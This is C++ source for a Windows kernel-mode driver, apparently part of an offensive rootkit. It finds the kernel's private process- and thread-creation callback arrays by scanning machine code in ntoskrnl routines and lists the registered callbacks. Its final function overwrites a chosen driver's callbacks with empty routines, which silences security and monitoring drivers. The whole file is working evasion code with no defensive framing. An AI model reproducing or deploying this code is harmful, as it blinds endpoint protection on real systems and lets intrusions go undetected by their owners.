#include "CallbackUtils.hpp"
#include "AddressUtils.hpp"
#include "Globals.hpp"

/**
 * @brief Enumerates loaded drivers by parsing the driver section inloadorder linked list
 */
VOID
BeEnumerateDrivers()
{
    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;
    PKLDR_DATA_TABLE_ENTRY first = entry;

    while ((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != first)
    {
        LOG_MSG("Driver: 0x%llx :: %ls\r\n", entry->DllBase, entry->BaseDllName.Buffer);
        entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
    }
}

/*
 * @brief Returns the driver that contains the address passed as an argument.
 *
 * @param[in] Address The address to look up.
 *
 * @returns PKLDR_DATA_TABLE_ENTRY The driver entry containing the address, or NULL if not found.
 */
PKLDR_DATA_TABLE_ENTRY
BeGetDriverForAddress(
    _In_ UINT64 address
)
{
    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;

    LOG_MSG("Looking for address: 0x%llx\r\n", address);

    //
    // TODO: dirty hack to avoid bug
    //
    for (auto i = 0; i < 512; ++i)
    {
        UINT64 startAddr = UINT64(entry->DllBase);
        UINT64 endAddr = startAddr + UINT64(entry->SizeOfImage);

        LOG_MSG("Looking for: %ls 0x%llx 0x%llx\r\n", entry->BaseDllName.Buffer, startAddr, endAddr);

        if (address >= startAddr && address < endAddr)
        {
            return (PKLDR_DATA_TABLE_ENTRY)entry;
        }

        entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
    }

    return NULL;
}

/*
 * @brief Gets the address of the array where kernel callbacks are stored.
 *
 * 1) Resolves the private Psp* routine from the Ps* routine by looking for CALL or JMP instructions.
 * 2) Resolves the array of callbacks from the Psp* routine by looking for LEA r13 or LEA rcx instructions.
 *
 * @param[in] Type The type of callback to resolve.
 *
 * @return UINT64 The address of the callbackRoutine array.
 */
UINT64
BeGetKernelCallbackArrayAddr(
    _In_ CALLBACK_TYPE type
)
{
    BeEnumerateDrivers();
    PCHAR callbackRoutineName;

    switch (type)
    {
    case CreateProcessNotifyRoutine:
        callbackRoutineName = "PsSetCreateProcessNotifyRoutine";
        break;
    case CreateThreadNotifyRoutine:
        callbackRoutineName = "PsSetCreateThreadNotifyRoutine";
        break;
    default:
        LOG_MSG("Unsupported callback type\r\n");
        return NULL;
    }

    UINT64 callbackRoutineAddr = 0;
    UINT64 pspCallbackRoutineAddr = 0;
    UINT64 callbackRoutineArrayAddr = 0;

    if (type == CreateProcessNotifyRoutine || type == CreateThreadNotifyRoutine)
    {
        //
        // Resolve PsSetCreateXYZNotifyRoutine
        //
        callbackRoutineAddr = (DWORD64)BeGetSystemRoutineAddress("ntoskrnl.exe", callbackRoutineName);
        if (!callbackRoutineAddr)
        {
            LOG_MSG("Failed to resolve set-notify routine\r\n");
            return NULL;
        }

        //
        // Now resolve PspSetCreateXYZNotifyRoutine
        // we look for CALL/JMP PspSetCreateXYZNotifyRoutine in the function assembly
        //
        for (UINT16 i = 0; i < 500; ++i)
        {
            if ((*(BYTE*)(callbackRoutineAddr + i) == ASM_CALL_NEAR)
                || (*(BYTE*)(callbackRoutineAddr + i) == ASM_JMP_NEAR))
            {
                //
                // Param for CALL is offset to our routine
                //
                LOG_MSG("Offset: 0x%llx\r\n", *(PUINT32*)(callbackRoutineAddr + i + 1));
                UINT32 offset = *(PUINT32)(callbackRoutineAddr + i + 1);

                //
                // Add offset to addr of next instruction to get psp address
                //
                pspCallbackRoutineAddr = callbackRoutineAddr + i + offset + 5;
                break;
            }
        }

        if (!pspCallbackRoutineAddr)
        {
            LOG_MSG("Failed to resolve private setnotify routine\r\n");
            return NULL;
        }

        LOG_MSG("Private (psp) NotifyRoutine: 0x%llx\r\n", pspCallbackRoutineAddr);

        //
        // Now we resolve the array of callbacks
        // we look for LEA r13 or LEA rcx <addr of callbackArray>
        //
        for (INT I = 0; I < 500; ++I)
        {
            if ((*(BYTE*)(pspCallbackRoutineAddr + I) == ASM_LEA_R13_BYTE1 && *(BYTE*)(pspCallbackRoutineAddr + I + 1) == ASM_LEA_R13_BYTE2)
                || (*(BYTE*)(pspCallbackRoutineAddr + I) == ASM_LEA_RCX_BYTE1 && *(BYTE*)(pspCallbackRoutineAddr + I + 1) == ASM_LEA_RCX_BYTE2))
            {
                //
                // Param for LEA is the address of the callback array
                //
                UINT32 offset = *(PUINT32)(pspCallbackRoutineAddr + I + 3);

                //
                // Add ofset to next instruction to get callback array addr
                //
                callbackRoutineArrayAddr = pspCallbackRoutineAddr + I + offset + 7;
                break;
            }
        }

        if (!pspCallbackRoutineAddr)
        {
            LOG_MSG("Failed to resolve Array for callbacks\r\n");
            return NULL;
        }

        return callbackRoutineArrayAddr;
    }

    return NULL;
}

/*
 * @brief Enumerates kernel callbacks set.
 *
 * @param[in] Type The type of callback to resolve.
 *
 * @returns ktd::vector<CALLBACK_DATA, PagedPool> Vector of callbacks.
 */
ktd::vector<CALLBACK_DATA, PagedPool>
BeEnumerateKernelCallbacks(_In_ CALLBACK_TYPE Type)
{
    auto data = ktd::vector<CALLBACK_DATA, PagedPool>();

    //
    // Get address for the kernel callback array
    //
    auto arrayAddr = BeGetKernelCallbackArrayAddr(Type);
    if (!arrayAddr)
    {
        LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
        return data;
    }

    LOG_MSG("Array for callbacks: 0x%llx\r\n", arrayAddr);

    //
    // TODO: max number
    //
    for (UINT8 i = 0; i < 16; ++i)
    {
        //
        // get current address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
        //
        PVOID currCallbackBlockAddr = (PVOID)(((UINT64*)arrayAddr)[i] & 0xFFFFFFFFFFFFFFF0);
        if (!currCallbackBlockAddr)
            continue;

        //
        // cast to callback routine block
        //
        auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);

        //
        // Get function address
        //
        auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;

        //
        // Get corresponding driver
        //
        auto driver = BeGetDriverForAddress(callbackFunctionAddr);

        //
        // If unbacked memory with no associated driver
        //
        if (driver == NULL)
        {
            //
            // Print info
            //
            LOG_MSG("Callback: <Unbacked Memory>, 0x%llx\r\n", callbackFunctionAddr);

            //
            // Create result struct
            //
            CALLBACK_DATA pcc = {
                0,
                callbackFunctionAddr,
                NULL
            };

            PWCH pwsUnbacked = L"Unbacked";
            memcpy(pcc.driverName, pwsUnbacked, (wcslen(pwsUnbacked) + 1) * sizeof(WCHAR));

            //
            // add to results
            //
            data.push_back(pcc);
        }
        else
        {
            //
            // Calculate offset of function
            //
            auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);

            LOG_MSG("Callback: %ls, 0x%llx + 0x%llx\r\n", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);

            //
            // Create result struct
            //
            CALLBACK_DATA Pcc = {
                (UINT64)driver->DllBase,
                offset,
                NULL
            };

            memcpy(Pcc.driverName, driver->BaseDllName.Buffer, (wcslen(driver->BaseDllName.Buffer) + 1) * sizeof(WCHAR));

            //
            // Add to results
            //
            data.push_back(Pcc);
        }
    }

    return data;
}

/**
 * @brief Empty callback routine to be used for replacing other kernel callback routines with any code that you want to run.
 */
VOID
BeEmptyCreateProcessNotifyRoutine(
    _In_ HANDLE  parentId,
    _In_ HANDLE  processId,
    _In_ BOOLEAN create
)
{
    UNREFERENCED_PARAMETER(parentId);
    UNREFERENCED_PARAMETER(processId);
    UNREFERENCED_PARAMETER(create);

    AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
}

/**
 * @brief Empty callback routine to be used for replacing other kernel callback routines with any code that you want to run.
 */
VOID
BeEmptyCreateThreadNotifyRoutine(
    _In_ HANDLE  processId,
    _In_ HANDLE  threadId,
    _In_ BOOLEAN create
) {
    UNREFERENCED_PARAMETER(processId);
    UNREFERENCED_PARAMETER(threadId);
    UNREFERENCED_PARAMETER(create);

    AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
}

/*
 * @brief Replaces kernel callbacks of a specific driver with empty callback routines.
 *
 * @param[in] TargetDriverModuleName Name of the driver whose callbacks should be replaced.
 * @param[in] Type The type of callback to replace.
 *
 * @return NTSTATUS Status of the operation.
 */
NTSTATUS
BeReplaceKernelCallbacksOfDriver(
    _In_ PWCH targetDriverModuleName,
    _In_ CALLBACK_TYPE type
)
{
    LOG_MSG("Target: %S\n", targetDriverModuleName);

    //
    // Get address for the kernel callback array
    //
    auto arrayAddr = BeGetKernelCallbackArrayAddr(type);
    if (!arrayAddr)
    {
        LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
        return STATUS_NOT_FOUND;
    }

    LOG_MSG("Array for callbacks: 0x%llx\r\n", arrayAddr);

    //
    // TODO: max number
    //
    for (UINT16 i = 0; i < 16; ++i)
    {
        //
        // Get callback array address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
        //
        auto currCallbackBlockAddr = (PVOID)(((UINT64*)arrayAddr)[i] & 0xFFFFFFFFFFFFFFF0);
        if (!currCallbackBlockAddr)
            continue;

        //
        // Cast to callback routine block
        //
        auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);

        //
        // Get function address
        //
        auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;

        //
        // Get corresponding driver
        //
        auto driver = BeGetDriverForAddress(callbackFunctionAddr);

        if (!driver)
        {
            LOG_MSG("Didnt find driver for callback\r\n");
            continue;
        }

        //
        // If it is the driver were looking for
        //
        if (wcscmp(driver->BaseDllName.Buffer, targetDriverModuleName) == 0)
        {
            //
            // Calculate offset of function
            //
            auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);

            LOG_MSG("Replacing callback with empty callback: %ls, 0x%llx + 0x%llx\r\n", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);

            auto addrOfCallbackFunction = (ULONG64)currCallbackBlockAddr + sizeof(ULONG_PTR);

            {
                AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
                LONG64 oldCallbackAddress;

                //
                // Replace routine by empty routine
                //
                switch (type)
                {
                case CreateProcessNotifyRoutine:
                    oldCallbackAddress = InterlockedExchange64((LONG64*)addrOfCallbackFunction, (LONG64)&BeEmptyCreateProcessNotifyRoutine);
                    break;
                case CreateThreadNotifyRoutine:
                    oldCallbackAddress = InterlockedExchange64((LONG64*)addrOfCallbackFunction, (LONG64)&BeEmptyCreateThreadNotifyRoutine);
                    break;
                default:
                    LOG_MSG("Invalid callback type\r\n");
                    return STATUS_INVALID_PARAMETER;
                    break;
                }

                //
                // Save old callback to restore later upon unloading
                //
                BeGlobals::BeCallbacksToRestore.addrOfCallbackFunction[BeGlobals::BeCallbacksToRestore.length] = addrOfCallbackFunction;
                BeGlobals::BeCallbacksToRestore.callbackToRestore[BeGlobals::BeCallbacksToRestore.length] = oldCallbackAddress;
                BeGlobals::BeCallbacksToRestore.callbackType[BeGlobals::BeCallbacksToRestore.length] = type;
                BeGlobals::BeCallbacksToRestore.length++;
            }
        }
    }

    LOG_MSG("Kernel callbacks erased: %i\n", BeGlobals::BeCallbacksToRestore.length);
    return STATUS_SUCCESS;
}